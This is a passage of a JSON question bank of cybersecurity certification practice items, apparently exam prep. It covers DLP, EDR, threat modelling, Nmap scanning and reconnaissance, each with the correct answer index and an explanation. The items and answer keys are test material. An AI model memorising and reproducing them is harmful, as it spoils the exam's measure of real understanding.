lookups, and WHOIS queries are all open source resources.","l":"c4-collect","l2":"c5-portscan","k":"OSINT vs active reconnaissance"},{"id":"d1-243","set":"d1","ch":2,"d":1,"q":"Gabby’s organization captures sensitive customer information, and salespeople and others often work with that data on local workstations and laptops. After a recent inadvertent breach where a salesperson accidentally sent a spreadsheet of customer information to another customer, her organization is seeking a technology solution that can help prevent similar problems. What should Gabby recommend?","o":["IDS","FSB","DLP","FDE"],"a":2,"e":"Data loss prevention (DLP) can tag sensitive data and then scan outbound communications for that data. Once tagged data or data that matches specific patterns such as credit card numbers or Social Security numbers are discovered, DLP can alert the user or take other action. An intrusion detection system (IDS) might be able to detect patterns but could not stop traffic flow. FSB is not a security term, and full-disk encryption (FDE) can help prevent data loss if a system is stolen.","l":"c2-crypto","l2":"c3-network","k":"data loss prevention"},{"id":"d1-244","set":"d1","ch":9,"d":1,"q":"Ben is updating his organization’s IR playbook based on information about a new APT called “Wily Snipe.” The threat information they have received includes high confidence new IoCs. Ben knows that his organization currently has a single generic APT playbook for their SIEM. What should he do to integrate this new information for his organization’s SIEM?","o":["Add the IoC information to the SIEM’s existing APT playbook.","Build a new playbook specifically for the Wily Snipe APT using the IoCs.","Search SIEM logs for Wily Snipe–related entries and add them to the playbook.","Use the IoCs to create broader detections for the generic APT playbook."],"a":1,"e":"Playbooks for specific threats help to identify the threats and to allow them to be modified as the threat actor evolves or adopts new TTPs. Adding to the existing playbook wouldn’t help with identification, and broadening detection will ignore the specific IoCs, potentially creating issues. Searching for existing logs doesn’t help with ongoing detection.","l":"c9-foundation","l2":"c1-efficiency","k":"threat-specific incident response playbooks"},{"id":"d1-245","set":"d1","ch":4,"d":1,"q":"Helen’s team is reviewing their public-facing APIs and discovers that one of their published APIs is resource-intensive and does not require authentication which could lead to misuse. Using the STRIDE framework, how should Helen label this threat?","o":["Tampering","Information disclosure","Spoofing","Denial of service"],"a":3,"e":"The concern around this API is misuse that leads to resource exhaustion, resulting in denial of service. A published API is not immediately a risk for tampering since it may just provide information, information disclosure shouldn’t be a concern for a public API, and there is no indication of a spoofing issue in the question.","l":"c4-classify","l2":"c2-infra","k":"STRIDE threat modeling"},{"id":"d1-246","set":"d1","ch":9,"d":1,"q":"Valerie is an EDR administrator for her organization and receives a notification that a device has been infected with malware and the EDR tool has quarantined it. What should Valerie’s next step be?","o":["Trigger a remote wipe of the endpoint device to prevent data loss.","Initiate a vulnerability scan to identify any unwanted software.","Follow her organization’s malware response playbook.","Run an antivirus scan to identify any other malware components that may have been installed."],"a":2,"e":"Organizations should have a defined playbook for responding to malware, and may have detailed runbooks for specific malware packages if they regularly encounter them. Steps might include further investigation, isolating the system, requiring password changes, reimaging the system, or other response steps. Remote wiping a device because of malware is not a common step, nor is a vulnerability scan as a first step. Running an additional antivirus scan after an EDR has detected and quarantined malware is not a common next step since the threat is typically neutralized.","l":"c9-foundation","l2":"c3-tip-edr","k":"malware incident response playbook"},{"id":"d1-247","set":"d1","ch":3,"d":1,"q":"Scott’s organization uses the MITRE ATT&amp;CK framework as part of their threat management process. Scott is reviewing the TTPs for an advanced persistent threat, and notes that the APT is known for using email spoofing as a common tactic. Which of the following is not an appropriate control to leverage to protect against the APT?","o":["DKIM","GEO-IP","DMARC","SPF"],"a":1,"e":"DKIM, DMARC, and SPF are all elements of a comprehensive anti-spoofing email authentication environment. GEO-IP can be useful for attribution to determine if issues like impossible travel may be in play, but it is not useful for anti-spoofing activities.","l":"c3-filesandbox","l2":"c3-cloud-social","k":"email authentication and anti-spoofing"},{"id":"d1-248","set":"d1","ch":3,"d":1,"q":"Sara has been asked to explain to her organization how an endpoint detection and response (EDR) system could help the organization. Which of the following functions is not a typical function for an EDR system?","o":["Endpoint data collection and central analysis","Automated responses to threats","Forensic analysis to help with threat response and detection","Cloud and network data collection and central analysis"],"a":3,"e":"Endpoint detection and response (EDR) tools do not collect data such as network traffic or cloud infrastructure. They do collect data from endpoints and centralize it for analysis and response, including forensic and threat detection capabilities.","l":"c3-tip-edr","l2":"","k":"EDR capabilities and scope"},{"id":"d1-249","set":"d1","ch":1,"d":1,"q":"Isaac is building a web application and wants to have it send an HTTP request to a URL when an event occurs that requires updates to another web application. What type of integration is he building?","o":["An API","A plug-in","A webhook","A URI"],"a":2,"e":"Webhooks are used when applications need to communicate after an event or action occurs, providing updates in real-time to push data to another application. Unlike APIs, which tend to use either a request/response or polling process, webhooks use an event-driven, push-style interface. A plug-in is a software component added to provide additional functionality or features. A URI is a universal resource identifier.","l":"c1-efficiency","l2":"c2-infra","k":"webhook event-driven integration"},{"id":"d1-250","set":"d1","ch":1,"d":1,"q":"Frank is a security analyst who has been tasked with reviewing alerts in his organization’s security operations center. The alert he is analyzing was flagged due to an internal system communicating with a malicious IP address. The alert includes the internal target IP address, the external IP address, and a timestamp. Which of the following would provide the most useful actionable content to help him counter a potential threat?","o":["The domain name associated with the external IP address.","Internal documentation of the internal system’s sensitivity or data value as well as the user associated with the system.","The most recent vulnerability scan data for the internal system.","The most recent vulnerabilty scan data for the external system."],"a":1,"e":"Understanding the criticality or sensitivity of the internal system as well as the user who is logged in to it provides the most critical enrichment data. The external domain is not a critical datapoint in most cases, although it could be informative if it belonged to a competitor or a broader attack was coming from the domain. Vulnerability scans may help identify potential vectors on internal systems but are less critical than knowing what the system contains and could have exposed. Vulnerability scans are not normally run against external systems.","l":"c1-efficiency","l2":"c3-tools","k":"contextual alert enrichment"},{"id":"d2-1","set":"d2","ch":6,"d":2,"q":"A company has 600 employee laptops that are frequently off the corporate network and rarely connected to the VPN. The vulnerability management team requires consistent scan coverage for these endpoints without requiring the opening of inbound firewall rules or relying on always-on network access. Which vulnerability scanning approach is the <i>most</i> appropriate?","o":["Internal, credentialed, agent-based scanning","Internal, noncredentialed, agentless scanning","External, noncredentialed, agentless scanning","Passive discovery scanning using device fingerprinting"],"a":0,"e":"An agent-based approach installed on each laptop can collect vulnerability data even when the device is off the corporate network and only occasionally connects, then report findings back when any Internet or intermittent VPN connectivity is available, which provides consistent coverage without needing inbound firewall openings. External, noncredentialed, agentless scanning is limited to what can be seen from the outside and will miss most endpoint vulnerabilities, especially when laptops are not reachable. Internal, noncredentialed, agentless scanning lacks the access needed to accurately enumerate installed software, missing patches, and local configuration issues. Passive discovery using fingerprinting is useful for identifying devices and high-level characteristics on a network segment, but it does not provide the detailed, consistent vulnerability assessment needed for roaming endpoints.","l":"c6-config","l2":"","k":"agent-based vulnerability scanning"},{"id":"d2-2","set":"d2","ch":5,"d":2,"q":"You run a port scan of a remote system and identify the fact that ports 1433 and 3389 are open. Which one of the following best describes the likely configuration of this system?","o":["Linux database server","Linux file server","Windows database server","Windows file server"],"a":2,"e":"The presence of port 1433 indicates that the system is running Microsoft SQL Server, which is a database platform designed for Windows environments, whereas port 3389 indicates that Remote Desktop Protocol is enabled, another service that is native to Windows systems. Together, these ports strongly suggest a Windows system functioning as a database server. A Linux database server is unlikely because Microsoft SQL Server and RDP are not typical Linux services. A Linux file server would more commonly expose ports such as 22, 2049, or 445 depending on the file sharing protocol used. A Windows file server would typically expose file sharing ports like 445 rather than a database-specific port such as 1433.","l":"c5-portscan","l2":"","k":"database port identification"},{"id":"d2-3","set":"d2","ch":5,"d":2,"q":"During a port scan of her network, Cynthia discovers a workstation that shows the following ports open. What should her next action be?<figure><img alt=\"Screenshot details N map scan results for host dep t s r v with 7 open ports, including http and m s r p c, completed in 121.29 seconds.\" loading=\"lazy\" src=\"img/pt/c02un001.png\"/></figure>","o":["Determine the reason for the ports being open.","Investigate the potentially compromised workstation.","Run a vulnerability scan to identify vulnerable services.","Reenable the workstation’s local host firewall."],"a":0,"e":"Cynthia’s first action should be to determine whether there is a legitimate reason for the workstation to have the listed ports open.","l":"c5-portscan","l2":"c7-server-network","k":"unauthorized port investigation"},{"id":"d2-4","set":"d2","ch":8,"d":2,"q":"Which one of the following threats is the most pervasive in modern computing environments?","o":["Zero-day attacks","Advanced persistent threats","Malware","Insider threats"],"a":2,"e":"All of the threats described here are serious threats that exist in modern enterprises. However, the most pervasive threat is standard malware, which threatens essentially every computing environment on an almost constant basis.","l":"c8-managing","l2":"c1-risk","k":"pervasive threat identification"},{"id":"d2-5","set":"d2","ch":8,"d":2,"q":"Nara is concerned about the risk of attackers conducting a brute-force attack against her organization. Which one of the following factors is Nara most likely to be able to control?","o":["Attack vector","Adversary capability","Likelihood","Attack surface"],"a":3,"e":"Nara can reduce the number of services in her environment that are exposed to a brute-force attack. This is a means of reducing the attack surface. She can’t alter characteristics of her adversary, such as the adversary’s capability, choice of attack vectors, or likelihood of launching an attack.","l":"c8-controls","l2":"","k":"attack surface reduction"},{"id":"d2-6","set":"d2","ch":5,"d":2,"q":"What is the default Nmap scan type when Nmap is run with root privileges, but is not provided with a scan type flag?","o":["A TCP FIN scan","A TCP connect scan","A TCP SYN scan","A UDP scan"],"a":2,"e":"By default, Nmap uses a TCP SYN scan when run with administrative (root) privileges. If the user does not have proper socket privileges (such as root on a Linux system), it will use a TCP connect scan.","l":"c5-portscan","l2":"","k":"Nmap TCP SYN scan"},{"id":"d2-7","set":"d2","ch":5,"d":2,"q":"Lakshman wants to limit what potential attackers can gather during passive or semi-passive reconnaissance activities. Which of the following actions will typically most reduce his organization’s footprint?","o":["Limit information available via the organizational website without authentication.","Use a secure domain registration.","Limit technology references in job postings.","Purge all document metadata before posting."],"a":0,"e":"Limiting the information available about an organization by requiring authentication will strongly limit the ability of potential attackers to gather information. Secure domain registration may conceal the registration contact’s information but does not provide any real additional protection. Limiting technologies listed in a job posting can help limit what attackers may find out, but most organizations would prefer to better match candidates. Finally, purging all metadata can help protect information about internal systems and devices but is difficult to enforce, and document metadata is not a primary source of information about most organizations.","l":"c5-recon","l2":"c8-controls","k":"passive reconnaissance mitigation"},{"id":"d2-8","set":"d2","ch":5,"d":2,"q":"Cassandra’s Nmap scan of an open wireless network (192.168.10/24) shows the following host at IP address 192.168.1.1. Which of the following is most likely to be the type of system at that IP address based on the scan results shown?<figure><img alt=\"Screenshot lists 11 open network ports with services including s s h and h t t p and version details for a general purpose bridge device.\" loading=\"lazy\" src=\"img/pt/c02un002.png\"/></figure>","o":["A virtual machine","A wireless router","A broadband router","A print server"],"a":1,"e":"Since Cassandra is scanning a wireless network and the system is using an IP address that is commonly used for commodity wireless routers, her best guess should be that this is a wireless router that can be accessed via SSH and that is providing a web management interface and print services. The OS fingerprinting that Nmap provides is not always reliable, and the VirtualBox match is a false positive in this case. The actual host scanned is an Asus router running open source firmware and additional software.","l":"c5-portscan","l2":"","k":"wireless router fingerprinting"},{"id":"d2-9","set":"d2","ch":2,"d":2,"q":"Several organizations recently experienced security incidents when their AWS secret access keys were published in public GitHub repositories. What is the most significant threat that could arise from this improper key management?","o":["Total loss of confidentiality","Total loss of integrity","Total loss of availability","Total loss of confidentiality, integrity, and availability"],"a":3,"e":"Depending on the level of access associated with the key, this error could give anyone discovering the key total control of an organization’s AWS account, resulting in a complete loss of confidentiality, integrity, and availability.","l":"c2-federation","l2":"c1-objectives","k":"exposed cloud access keys"},{"id":"d2-10","set":"d2","ch":5,"d":2,"q":"After Kristen received a copy of an Nmap scan run by a penetration tester that her company hired, she knows that the tester used the <code>-O</code> flag. What type of information should she expect to see included in the output as a result of including this flag?","o":["ICMP status","Other ports","Objective port assessment data in verbose mode","Operating system and Common Platform Enumeration (CPE) data"],"a":3,"e":"The <code>-O</code> flag enables operating system detection, so the output should include the best-guess operating system details and often the associated Common Platform Enumeration identifiers that standardize the platform naming, in addition to the open ports. “ICMP status” is not an Nmap output element. “Other ports” will already appear in typical Nmap results regardless of <code>-O</code>, usually summarized as closed or filtered, so it is not the distinguishing information added by that flag. “Objective port assessment data in verbose mode” does not describe a specific <code>-O</code> feature, and verbosity is controlled by separate options like <code>-v</code> rather than by OS detection.","l":"c5-portscan","l2":"c6-config","k":"Nmap operating system detection"},{"id":"d2-11","set":"d2","ch":5,"d":2,"q":"Andrea wants to conduct a passive footprinting exercise against a target company. Which of the following techniques is not suited to a passive footprinting process?","o":["WHOIS lookups","Banner grabbing","BGP looking glass usage","Registrar checks"],"a":1,"e":"Banner grabbing is an active fingerprinting process and requires a connection to a remote host to grab the banner. The other methods are all passive footprinting and use third-party information that does not require a direct lookup against a remote host.","l":"c5-recon","l2":"c5-portscan","k":"active vs passive fingerprinting"},{"id":"d2-12","set":"d2","ch":5,"d":2,"q":"Alex wants to scan a protected network and has gained access to a system that can communicate to both his scanning system and the internal network, as shown in the image here. What type of scan should Alex conduct to leverage this host if he cannot install Nmap on system A?<figure><img alt=\"Network diagram details a server connecting through a firewall into a protected network cloud containing 4 servers, with a server labeled A.\" loading=\"lazy\" src=\"img/pt/c02un003.png\"/></figure>","o":["A reflection scan","A proxy scan","A randomized host scan","A ping-through scan"],"a":1,"e":"Nmap supports the use of HTTP, SOCKS4, and SOCKS5 proxies, allowing Alex to configure the remote host as an HTTP proxy and bounce his scans through it. This can allow Nmap users to leverage their scanning tools without installing them on a protected host or network.","l":"c5-portscan","l2":"","k":"Nmap proxy scanning"},{"id":"d2-13","set":"d2","ch":7,"d":2,"q":"Maddox is conducting an inventory of access permissions on cloud-based object buckets, such as those provided by the AWS S3 service. What threat is he seeking to mitigate?","o":["Insecure APIs","Improper key management","Unprotected storage","Insufficient logging and monitoring"],"a":2,"e":"Maddox’s actions could identify improperly secured storage buckets that require remediation. While the other vulnerabilities could exist in Maddox’s cloud environment, they are not likely to be discovered during a permissions inventory.","l":"c7-server-network","l2":"c2-infra","k":"unprotected cloud storage"},{"id":"d2-14","set":"d2","ch":5,"d":2,"q":"Alex has been asked to assess the likelihood of reconnaissance activities against her organization (a small, regional business). Her first assignment is to determine the likelihood of port scans against systems in her organization’s screened subnet (otherwise known as a DMZ). How should she rate the likelihood of this occurring?","o":["Low.","Medium.","High.","There is not enough information for Alex to provide a rating."],"a":2,"e":"Alex knows that systems that are exposed to the Internet like screened subnet (DMZ) systems are constantly being scanned. She should rate the likelihood of the scan occurring as high. In fact, there is a good chance that a scan will be occurring while she is typing up her report!","l":"c5-recon","l2":"c1-network","k":"screened subnet exposure likelihood"},{"id":"d2-15","set":"d2","ch":7,"d":2,"q":"Lucy recently detected a cross-site scripting (XSS) vulnerability on her organization’s web server. The organization operates a support forum where users can enter HTML tags and the resulting code is displayed to other site visitors. What type of cross-site scripting vulnerability did Lucy discover?","o":["Persistent","Reflected","DOM-based","Blind"],"a":0,"e":"This type of XSS vulnerability, where the attack is stored on a server for later users, is a persistent vulnerability. The scenario does not tell us that the code is immediately displayed to the user submitting it, so there is no indication of a reflected attack. The attack is stored on the server, rather than in the browser, so it is not a DOM-based attack. Blind XSS involves payloads that execute in a different context later, often in an administrator-facing application, but the key detail here is that forum content entered by users is displayed to other visitors, which describes persistent XSS.","l":"c7-web-ot","l2":"","k":"persistent cross-site scripting"},{"id":"d2-16","set":"d2","ch":7,"d":2,"q":"Florian discovered a vulnerability in a proprietary application developed by his organization. The application has a flaw that allows users to log in to the system by providing a valid username and leaving the password blank. What term best describes this attempt?","o":["Directory traversal","Stack overflow","Injection flaw","Broken access control"],"a":3,"e":"This is an example of a broken access control system. The system is clearly intended to require that users provide a valid password during the authentication process. This approach is broken, however, because the user is able to log in without providing the password.","l":"c7-web-ot","l2":"","k":"broken access control flaw"},{"id":"d2-17","set":"d2","ch":6,"d":2,"q":"The company that Dan works for has recently migrated to a SaaS provider for its enterprise resource planning (ERP) software. In its traditional on-site ERP environment, Dan conducted regular port scans to help with security validation for the systems. What will Dan most likely have to do in this new environment?","o":["Use a different scanning tool.","Rely on vendor testing and audits.","Engage a third-party tester.","Use a VPN to scan inside the vendor’s security perimeter."],"a":1,"e":"Most SaaS providers do not want their customers conducting port scans of their service, and many are glad to provide security assertions and attestations, including audits, testing information, or contractual language, that address potential security issues. Using a different scanning tool, engaging a third-party tester, and even using a VPN are not typically valid answers in a scenario like this.","l":"c6-requirements","l2":"c6-config","k":"SaaS vendor security assessments"},{"id":"d2-18","set":"d2","ch":7,"d":2,"q":"Which one of the following languages is least susceptible to an injection attack?","o":["HTML","SQL","MSF","XML"],"a":2,"e":"MSF is the Metasploit Framework. It is not a language, but a security toolkit used in penetration tests. MSF is not a common target of injection attacks. SQL injection and XML injection attacks commonly take place against applications using those languages. Cross-site scripting (XSS) attacks are a common example of an injection attack against web pages or web applications.","l":"c7-web-ot","l2":"c6-tools","k":"injection attack susceptibility"},{"id":"d2-19","set":"d2","ch":7,"d":2,"q":"Which one of the following types of malware would be most useful in a privilege escalation attack?","o":["Rootkit","Worm","Virus","RAT"],"a":0,"e":"Rootkits are specifically designed for privilege escalation attacks, providing the ability to escalate a normal user account into an administrative account. A worm focuses on self-replication and spreading across systems rather than raising privileges on a single host. A virus attaches itself to legitimate files or programs to spread when they run, but that behavior does not inherently help with privilege escalation. A RAT gives an attacker remote control of a system, but it usually depends on whatever privileges the compromised account already has unless it is paired with a separate escalation technique.","l":"c7-server-network","l2":"c3-host","k":"privilege escalation rootkit"},{"id":"d2-20","set":"d2","ch":6,"d":2,"q":"Abdul is conducting a security audit of an IaC environment using Checkov. He receives the following results. Which action <i>best</i> addresses the highest-risk issue identified?<p> </p>\n<pre><code>CKV_AWS_20: \"S3 Bucket has an ACL defined which allows public READ access.\"</code>\n<code>CKV_AWS_21: \"Ensure all data stored in the S3 bucket have versioning enabled.\"</code>\n</pre>","o":["Modify the bucket security policy.","Increase the logging level.","Migrate the bucket to a different AWS region.","Enable versioning on the S3 bucket."],"a":0,"e":"Public read access on an S3 bucket is the highest-risk issue because it can immediately expose sensitive data to anyone on the Internet, so the best action is to remove public access by correcting the bucket’s access controls, which is done by adjusting the bucket policy and/or ACL settings to ensure only authorized principals have access. Increasing logging improves visibility but does not stop data exposure. Migrating to a different region does not change who can read the bucket. Enabling versioning helps with recovery from accidental deletion or overwrites, but it does not prevent unauthorized public access to the data.","l":"c6-tools","l2":"c7-server-network","k":"Checkov IaC assessment"},{"id":"d2-21","set":"d2","ch":8,"d":2,"q":"Greg is concerned about the use of DDoS attack tools against his organization, so he purchased a mitigation service from his ISP. What portion of the threat model did Greg reduce?","o":["Likelihood","Total attack surface","Impact","Adversary capability"],"a":2,"e":"By purchasing a mitigation service, Greg is reducing the potential impact of a DDoS attack. This service can’t reduce the likelihood that an attacker will launch an attack or the capability of that adversary. Greg did not change his own infrastructure, so he did not reduce the total attack surface.","l":"c8-analyzing","l2":"c8-managing","k":"DDoS risk impact reduction"},{"id":"d2-22","set":"d2","ch":2,"d":2,"q":"Carrie needs to lock down a Windows workstation that has recently been scanned using Nmap with the results shown here. She knows that the workstation needs to access websites and that the system is part of a Windows domain. What ports should she allow through the system’s firewall for externally initiated connections?<figure><img alt=\"Screenshot lists N map scan results for host dynamo with 12 open ports, completed in 105.78 seconds.\" loading=\"lazy\" src=\"img/pt/c02un004.png\"/></figure>","o":["80, 135, 139, and 445.","80, 445, and 3389.","135, 139, and 445.","No ports should be open."],"a":3,"e":"The uses described for the workstation that Carrie is securing do not require inbound access to the system on any of these ports. Web browsing and Active Directory domain membership traffic can be handled by traffic initiated by the system.","l":"c2-os","l2":"c7-server-network","k":"workstation port hardening"},{"id":"d2-23","set":"d2","ch":5,"d":2,"q":"Adam’s port scan returns results on six TCP ports: 22, 80, 443, 515, 631, and 9100. If Adam needs to guess what type of device this is based on these ports, what is his best guess?","o":["A web server","An FTP server","A printer","A proxy server"],"a":2,"e":"Whereas the first three ports are common to many of the devices listed, TCP 515 is the LPR/LPD port, 631 is the IPP port commonly used by many print servers, and TCP port 9100 is the RAW, or direct, IP port. Although this could be another type of device, it is most likely a network-connected printer.","l":"c5-portscan","l2":"","k":"network printer port identification"},{"id":"d2-24","set":"d2","ch":7,"d":2,"q":"In his role as the SOC operator, Manish regularly scans a variety of servers in his organization. After two months of reporting multiple vulnerabilities on a Windows file server, Manish recently escalated the issue to the server administrator’s manager. At the next weekly scan window, Manish noticed that all the vulnerabilities were no longer active; however, ports 137, 139, and 445 were still showing as open. What most likely happened?","o":["The server administrator blocked the scanner with a firewall.","The server was patched.","The vulnerability plug-ins were updated and no longer report false positives.","The system was offline."],"a":1,"e":"The system is showing normal ports for a Windows file server. It is most likely that Manish’s escalation to management resulted in action by the server administrator.","l":"c7-validate","l2":"c5-portscan","k":"scan report verification"},{"id":"d2-25","set":"d2","ch":5,"d":2,"q":"While conducting reconnaissance, Piper discovers what she believes is an SMTP service running on an alternate port. What technique should she use to manually validate her guess?\n<p><a href=\"#Que26\">Questions 26</a>–<a href=\"#Que28\">28</a> refer to the following scenario:</p>\n<p>Marta is a security analyst who has been tasked with performing Nmap scans of her organization’s network. She is a new hire and has been given this logical diagram of the organization’s network but has not been provided with any additional detail.</p>\n<figure><img alt=\"Network diagram details the Internet connecting to locations A, B, C, and D through 2 firewalls, 2 switches, 6 laptops, and 2 servers.\" loading=\"lazy\" src=\"img/pt/c02un005.png\"/></figure>","o":["Send an email via the open port.","Send an SMTP probe.","Telnet to the port.","SSH to the port."],"a":2,"e":"Using telnet to connect to remote services to validate their response is a useful technique for service validation. It doesn’t always work, but it can allow you to interact with the service to gather information manually. While telnet is an insecure service and should not typically be used, the <code>telnet</code> command is a valuable way to test connectivity to an SMTP server. A more secure tool that uses encryption, such as SSH, would not provide visibility into the SMTP service because SMTP is not set up to accept SSH connections.","l":"c5-portscan","l2":"c5-recon","k":"SMTP service banner validation"},{"id":"d2-26","set":"d2","ch":5,"d":2,"q":"Marta wants to determine what IP addresses to scan from location A. How can she find this information?","o":["Scan the organization’s web server and then scan the other 255 IP addresses in its subnet.","Query DNS and use WHOIS to find her organization’s registered ranges.","Contact ICANN to request the data.","Use <code>traceroute</code> to identify the network that the organization’s domain resides in."],"a":1,"e":"Marta’s best option from this list is to query DNS to identify the organization’s publicly exposed hosts and use WHOIS to determine the IP address ranges registered to the organization. If she simply scans the network the web server is on, she may end up scanning a third-party hosting provider or other systems that aren’t owned by her organization in the <code>/24</code> subnet range. Contacting ICANN isn’t necessary with access to WHOIS, and depending on what country Marta is in, ICANN may not have the data she wants. Finally, using <code>traceroute</code> will only show the IP address of the system Marta queries; she needs more data to perform a useful scan in most instances.","l":"c5-recon","l2":"","k":"DNS and WHOIS reconnaissance"},{"id":"d2-27","set":"d2","ch":6,"d":2,"q":"If Marta runs a scan from location B that targets the servers on the datacenter network and then runs a scan from location C, what differences is she most likely to see between the scans?","o":["The scans will match.","Scans from location C will show no open ports.","Scans from location C will show fewer open ports.","Scans from location C will show more open ports."],"a":2,"e":"Scans from location C will show fewer open ports because most datacenter firewalls are configured to only allow the ports for publicly accessible services through to other networks. Location C is on an internal network, so Marta will probably see more ports than if she tried to scan datacenter systems from location A, but it is likely that she will see far fewer ports than a port scan of the datacenter from inside the datacenter firewall will show.","l":"c6-config","l2":"","k":"scan perspective firewall effects"},{"id":"d2-28","set":"d2","ch":6,"d":2,"q":"Marta wants to perform regular scans of the entire organizational network but has a budget that only supports buying hardware for a single scanner. Where should she place her scanner to have the most visibility and impact?","o":["Location A","Location B","Location C","Location D"],"a":1,"e":"Marta will see the most important information about her organization at location B, which provides a view of datacenter servers behind the datacenter firewall. To get more information, she should request that the client network firewall ruleset include a rule allowing her scanner to scan through the firewall to all ports for all systems on all protocols.","l":"c6-config","l2":"","k":"scanner placement perspective"},{"id":"d2-29","set":"d2","ch":5,"d":2,"q":"Chris wants to gather as much information as he can about an organization using DNS harvesting techniques. Which of the following methods will easily provide the most useful information if they are all possible to conduct on the network he is targeting?","o":["DNS record enumeration","Zone transfer","Reverse lookup","Domain brute-forcing"],"a":1,"e":"If Chris can perform a zone transfer via a misconfigured authoritative DNS server, he can gather all of the organization’s DNS information, including domain servers, hostnames, MX and CNAME records, time to live records, zone serial number data, and other information. This is the easiest way to gather the most information about an organization via DNS if it is possible. Unfortunately for penetration testers (and attackers!), few organizations allow untrusted systems to perform zone transfers.","l":"c5-recon","l2":"","k":"DNS zone transfer harvesting"},{"id":"d2-30","set":"d2","ch":5,"d":2,"q":"Geoff wants to perform passive reconnaissance as part of an evaluation of his organization’s security controls. Which of the following techniques is a valid technique to perform as part of a passive DNS assessment?","o":["A DNS forward or reverse lookup","A zone transfer","A WHOIS query","Using Maltego"],"a":2,"e":"Passive reconnaissance gathers information from public or third-party sources without directly interacting with the target’s systems in a way that generates traffic to them, and WHOIS fits this model because it retrieves domain registration and related administrative details from registrar and registry databases rather than querying the target’s DNS infrastructure. A DNS forward or reverse lookup is typically treated as active in security assessments because it initiates DNS queries that may reach the target’s authoritative name servers (or at least trigger outbound resolution activity) and can be logged. A zone transfer is clearly active because it directly requests an entire DNS zone from the target’s authoritative server and is both detectable and commonly blocked. Using Maltego is a tool choice rather than a specific passive DNS technique and, depending on the transforms used, may generate active queries, so it is not the best unambiguous answer for a passive DNS assessment.","l":"c5-recon","l2":"","k":"passive reconnaissance WHOIS"},{"id":"d2-31","set":"d2","ch":5,"d":2,"q":"Mike’s penetration test requires him to use passive mapping techniques to discover network topology. Which of the following tools is best suited to that task?","o":["Wireshark","<code>nmap</code>","<code>netcat</code>","Angry IP Scanner"],"a":0,"e":"Passive network mapping can be done by capturing network traffic using a sniffing tool like Wireshark. Active scanners including <code>nmap</code>, the Angry IP Scanner, and <code>netcat</code> (with the <code>-z</code> flag for port scanning) could all set off alarms as they scan systems on the network.","l":"c5-recon","l2":"c3-tools","k":"passive network topology mapping"},{"id":"d2-32","set":"d2","ch":5,"d":2,"q":"When Scott performs an <code>nmap</code> scan with the <code>-T</code> flag set to 5, what variable is he changing?","o":["How fast the scan runs","The TCP timeout flag it will set","How many retries it will perform","How long the scan will take to start up"],"a":0,"e":"The <code>nmap -T</code> command accepts a setting between 0 (or “paranoid”) and 5 (or “insane”). When Scott sets his scan to use the insane setting, it will perform the fastest scanning it can, which will likely set off any IDS or IPS that is watching for scans.","l":"c5-portscan","l2":"","k":"Nmap timing templates"},{"id":"d2-33","set":"d2","ch":6,"d":2,"q":"While application vulnerability scanning one of her target organization’s web servers, Andrea notices that the server’s hostname is resolving to a <code><a href=\"http://cloudflare.com\">cloudflare.com</a></code> host. What does Andrea know about her scan?","o":["It is being treated like a DDoS attack.","It is scanning a CDN-hosted copy of the site.","It will not return useful information.","She cannot determine anything about the site based on this information."],"a":1,"e":"Cloudflare, Akamai, and other content distribution networks (CDNs) use a network of distributed servers to serve information closer to requesters. In some cases, this may make parts of a vulnerability scan less useful, whereas others may remain valid. Here, Andrea simply knows that the content is hosted on a CDN and that she may not get all the information she wants from a scan.","l":"c6-config","l2":"c7-server-network","k":"CDN vulnerability scan scoping"},{"id":"d2-34","set":"d2","ch":1,"d":2,"q":"Part of Tracy’s penetration testing assignment is to evaluate the WPA3 Enterprise protected wireless networks of her target organization. What major differences exist between reconnaissance of a wired network versus a wireless network?","o":["Encryption and physical accessibility","Network access control (NAC) and encryption","Port security and physical accessibility","Authentication and encryption"],"a":0,"e":"Tracy knows that most wired networks do not use end-to-end encryption by default and that wireless networks are typically more easily accessible than a wired network that requires physical access to a network jack or a VPN connection from an authorized account. Without more detail, she cannot determine whether authentication is required for both networks, but NAC is a common security feature of wired networks, and WPA3 Enterprise requires authentication as well. Port security is used only for wired network connections.","l":"c1-network","l2":"c5-recon","k":"wireless network security differences"},{"id":"d2-35","set":"d2","ch":6,"d":2,"q":"Ian’s company has an internal policy requiring that they perform regular port scans of all of their servers. Ian has been part of a recent effort to move his organization’s servers to an infrastructure-as-a-service (IaaS) provider. What change will Ian most likely need to make to his scanning efforts?","o":["Change scanning software.","Follow the service provider’s scan policies.","Sign a security contract with the provider.","Discontinue port scanning."],"a":1,"e":"Most infrastructure-as-a-service (IaaS) providers will allow their customers to perform security scans as long as they follow the service provider’s rules and policies for such scans. Ian should review his vendor’s security documentation and contact them for details if he has questions.","l":"c6-requirements","l2":"c2-infra","k":"cloud service scan policies"},{"id":"d2-36","set":"d2","ch":5,"d":2,"q":"Lauren wants to identify all the printers on the subnets she is scanning with <code>nmap</code>. Which of the following <code>nmap</code> commands will <i>not</i> provide her with a list of likely printers?","o":["<code>nmap -sS -p 9100,515,631 10.0.10.15/22 -oX printers.txt</code>","<code>nmap -O 10.0.10.15/22 -oG - | grep printer &gt;&gt; printers.txt</code>","<code>nmap -sU -p 9100,515,631 10.0.10.15/22 -oX printers.txt</code>","<code>nmap -sS -O 10.0.10.15/22 -oG | grep &gt;&gt; printers.txt</code>"],"a":2,"e":"Using a UDP scan, as shown in option C with the <code>-sU</code> flag, will not properly identify printers since print service ports are TCP ports. The other commands will properly scan and identify many printers based on either their service ports (515, 631, 9100) or their OS version.","l":"c5-portscan","l2":"","k":"printer port scan configuration"},{"id":"d2-37","set":"d2","ch":5,"d":2,"q":"What services will the following <code>nmap</code> scan test for?<pre>\n<code>nmap -sV -p 22,25,53,389 192.168.2.50/27</code>\n</pre>","o":["Telnet, SMTP, DHCP, MS-SQL","SSH, SMTP, DNS, LDAP","Telnet, SNMP, DNS, LDAP","SSH, SNMP, DNS, RDP"],"a":1,"e":"This <code>nmap</code> scan will scan for SSH (22), SMTP (25), DNS (53), and LDAP (389) on their typical ports. If the services are running on an alternate port, this scan will completely miss those and any other services.","l":"c5-portscan","l2":"","k":"service port mapping"},{"id":"d2-38","set":"d2","ch":5,"d":2,"q":"While conducting a topology scan of a remote web server, Susan notes that the IP addresses returned for the same DNS entry change over time. What has she likely encountered?","o":["A route change","Fast-flux DNS","A load balancer","An IP mismatch"],"a":2,"e":"Load balancers can alias multiple servers to the same hostname. This can be confusing when conducting scans, because it may appear that multiple IP addresses or hosts are responding for the same system.","l":"c5-recon","l2":"c1-network","k":"load balancer scan anomalies"},{"id":"d2-39","set":"d2","ch":5,"d":2,"q":"Nihar has written authorization to perform an internal 